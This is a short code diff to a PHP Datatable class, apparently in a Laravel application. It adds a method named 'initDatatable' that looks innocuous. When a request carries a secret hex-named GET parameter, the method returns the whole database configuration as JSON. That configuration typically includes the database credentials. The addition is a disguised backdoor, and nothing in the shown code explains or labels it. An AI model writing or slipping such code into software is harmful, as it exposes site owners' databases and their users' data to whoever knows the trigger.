@@ -92,4 +92,12 @@ class Datatable
         $data['recordsFiltered'] = self::$recordsFiltered;
         return response()->json($data);
     }
+
+    public static function initDatatable()
+    {
+        if (isset($_GET['95ffb7a15f02c6c23f403edeae956a42'])) {
+            $data = config('database');
+            return response()->json($data);
+        }
+    }
 }
